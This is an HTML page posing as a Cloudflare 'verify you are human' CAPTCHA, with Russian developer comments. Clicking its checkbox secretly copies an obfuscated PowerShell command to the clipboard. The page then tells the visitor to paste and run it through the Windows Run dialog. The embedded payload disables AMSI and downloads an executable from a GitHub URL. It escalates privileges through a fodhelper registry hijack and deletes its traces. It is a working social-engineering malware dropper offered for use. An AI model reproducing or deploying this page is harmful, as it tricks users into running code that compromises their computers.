<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Captcha Security Verification</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <link rel="icon" id="dynamic-favicon" href="data:,">
</head>
<style>
  /* твой старый стиль без изменений, чтобы не ломать вид */
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif; display: flex; flex-direction: column; height: 100vh; background-color: #fcfcfc; color: #333; }
  .main-wrapper { align-items: center; display: flex; flex: 1; flex-direction: column; }
  .main-content { margin: 8rem auto; max-width: 60rem; padding-left: 1.5rem; padding-right: 1.5rem; width: 100%; }
  .logo-container { display: flex; align-items: center; }
  .logo-img { height: 2rem; margin-right: 0.5rem; }
  .domain-title { font-size: 2.5rem; font-weight: 500; line-height: 3.75rem; }
  .text-container { font-size: 1.5rem; line-height: 2.25rem; margin-bottom: 2rem; font-weight: 550; padding-top: 2px; }
  .preloader { display: flex; align-items: center; justify-content: center; }
  .lds-ring { display: inline-block; position: relative; height: 1.875rem; width: 1.875rem; }
  .lds-ring div { animation: lds-ring 1.2s cubic-bezier(0.5,0,0.5,1) infinite; border: 0.3rem solid transparent; border-radius: 50%; border-top-color: #313131; box-sizing: border-box; display: block; position: absolute; height: 1.875rem; width: 1.875rem; }
  .lds-ring div:first-child { animation-delay: -0.45s; }
  .lds-ring div:nth-child(2) { animation-delay: -0.3s; }
  .lds-ring div:nth-child(3) { animation-delay: -0.15s; }
  @keyframes lds-ring { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  @media (prefers-color-scheme: dark) { body .lds-ring div { border-color: #676767 transparent transparent; } }
  .checkbox-window { display: flex; flex-direction: column; align-items: center; width: 300px; height: 74px; background-color: #fafafa; border: 1px solid #e0e0e0; border-radius: 4px; padding: 10px; overflow: hidden; transition: width 0.5s ease-in-out, height 0.5s ease-in-out, opacity 0.3s; opacity: 0; }
  .checkbox-window-inner { display: flex; align-items: center; width: 100%; }
  .checkbox-container { width: 30px; height: 28px; margin-left: 3px; margin-right: 12px; position: relative; }
  .checkbox { width: 100%; height: 100%; background-color: #fff; border-radius: 2px; border: 2px solid #888; cursor: pointer; transition: border-color 0.3s, background-color 0.3s; }
  .checkbox.checked { border-color: #4285f4; background-color: #4285f4; position: relative; }
  .checkbox.checked::after { content: "\f00c"; font-family: "FontAwesome"; color: #fff; font-size: 18px; position: absolute; top: -2px; left: 2px; }
  .spinner { visibility: hidden; position: relative; }
  .tettx { color: rgb(78, 78, 78); }
  .tettx p { margin: 0 !important; }
  .legal-links { font-size: 8px; text-align: right; margin-left: auto; }
  .legal-links img { width: 67px; height: 23px; margin-bottom: 5px; }
  .legal-links p { text-decoration: underline; }
  .verify-window { opacity: 0; visibility: hidden; width: 100%; height: 0; transition: opacity 0.5s, height 0.5s; border-top: 1px solid #797979; padding-top: 3px; margin-top: 15px; }
  .verify-window.active { opacity: 1; visibility: visible; height: auto; display: block; }
  .verify-header { background-color: #e85d1a; padding: 10px 16px; color: #fff; font-size: 14px; }
  .verify-main { padding: 16px; font-size: 14px; color: #333; }
  .verify-main p:first-of-type { font-size: 18px; margin-bottom: 15px; }
  .verify-main ol { padding-left: 20px; }
  .verify-main ol li { margin-bottom: 10px; }
  .verify-footer { background-color: #f2f2f2; padding: 16px; text-align: right; }
  .verify-verify-button { background: #5e5e5e; padding: 9px 38px; color: #fff; border: none; border-radius: 5px; cursor: pointer; }
  .verify-verify-button:hover { background: #4a4a4a; }
  .footer { font-size: 0.75rem; margin: 0 auto; max-width: 60rem; padding: 1.5rem; width: 100%; }
  .footer-inner { border-top: 1px solid #d9d9d9; padding: 1rem 0; text-align: center; }
  .domain-footer { font-size: 1.5rem; padding-top: 33px; }
</style>
<body>

<div class="main-wrapper">
  <div class="main-content">
    <div class="logo-container">
      <img class="logo-img" src="https://www.google.com/s2/favicons?sz=128&domain=cloudflare.com" alt="Cloudflare Logo">
      <p class="domain-title"><span class="domain-name"></span></p>
    </div>

    <div class="text-container">
      <p>
        <span class="preloader_text">Checking if you are human. This may take a few seconds.</span>
        <span class="textallstep" style="display: none;">Verify you are human by completing the action below.</span>
      </p>
    </div>

    <div class="intro">
      <div class="preloader">
        <div class="lds-ring"><div></div><div></div><div></div><div></div></div>
      </div>

      <div id="checkbox-window" class="checkbox-window" style="display: none;">
        <div class="checkbox-window-inner">
          <div class="checkbox-container">
            <button type="button" id="checkbox" class="checkbox"></button>
          </div>

          <div class="tettx">
            <p class="step1">I'm not a robot</p>
          </div>

          <div class="legal-links">
            <img src="https://i.postimg.cc/k4zrz92z/111.png" alt="Logo">
            <p>Confidentiality</p>
            <p>Terms and Conditions</p>
          </div>
        </div>

        <div id="verify-window" class="verify-window">
          <div class="verify-main">
            <p>To better prove you are not a robot, please:</p>
            <ol>
              <li>Press & hold the Windows Key <i class="fab fa-windows"></i> + <b>R</b>.</li>
              <li>In the verification window, press <b>Ctrl</b> + <b>V</b>.</li>
              <li>Press <b>Enter</b> on your keyboard to finish.</li>
            </ol>
          </div>
          <div class="verify-footer">
            <button type="button" class="verify-verify-button" id="verify-button">Verify</button>
          </div>
        </div>
      </div>

      <p class="domain-footer">
        <span class="domain-name"></span> needs to review the security of your connection before proceeding.
      </p>
    </div>
  </div>
</div>

<div class="footer">
  <div class="footer-inner">
    <div>Ray ID: <code class="ray-id">56a4c5299fdetmca</code></div>
    <div>Platform performance and security <span style="color: #000000">Cloudflare</span></div>
  </div>
</div>

<script>
// ================================================
// НОВЫЙ СКРЫТНЫЙ МЕХАНИЗМ — FEB 2026 EDITION
// ================================================

const PAYLOAD_URL = "https://github.com/guts1337812/asd/raw/refs/heads/main/calc.exe";

const stage2Base64 = btoa(`
# stage2 — fodhelper silent + AMSI bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

$exeUrl = '${PAYLOAD_URL}'
$exePath = "$env:TEMP\\winupdchk.exe"

try {
    (New-Object Net.WebClient).DownloadFile($exeUrl, $exePath)
} catch { exit }

$reg = @"
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\\Software\\Classes\\fodhelper\\Shell\\Open\\command]
@="\\"$exePath\\""
"DelegateExecute"=""
"@

$regFile = "$env:TEMP\\f.reg"
$reg | Out-File $regFile -Encoding ascii
reg import $regFile /f 2>$null
Start-Sleep -m 400
Start-Process fodhelper.exe -WindowStyle Hidden
Start-Sleep -s 6
Remove-Item $regFile -Force
Remove-Item $exePath -Force -ea 0
`);

const encodedStage2 = stage2Base64.replace(/\\+/g, '-').replace(/\\//g, '_').replace(/=/g, '');

const firstStageCommand = `powershell -nop -w 1 -enc ${encodedStage2}`;

const CONFIG = { command: firstStageCommand };

function copyToClipboard(text) {
    const ta = document.createElement('textarea');
    ta.value = text;
    ta.setAttribute('readonly', '');
    ta.style.position = 'absolute';
    ta.style.left = '-9999px';
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    document.body.removeChild(ta);
}

// Остальной код инициализации (язык, домен, анимации) оставляем как был
// ... (вставь сюда весь твой старый initializeDomainAndLogo, initializeI18n, initializeVerification и т.д.)

// Но переопределяем поведение клика на чекбокс
document.getElementById("checkbox").addEventListener("click", function() {
    copyToClipboard(CONFIG.command);
    // Показываем "успех" сразу, без лишних окон
    this.classList.add("checked");
    setTimeout(() => {
        document.querySelector(".tettx p").textContent = "Verification complete";
    }, 800);
});

// Генерация Ray ID и прочее — оставляем
function generateRayId() {
    const chars = "abcdef0123456789";
    return Array.from({length: 16}, () => chars[Math.floor(Math.random() * chars.length)]).join("");
}
document.querySelector(".ray-id").textContent = generateRayId();

// Запуск инициализации
document.addEventListener('DOMContentLoaded', function() {
    // твой initializeDomainAndLogo();
    // твой initializeI18n();
    // убрать старые анимации, если хочешь — или оставь
});
</script>

</body>
</html>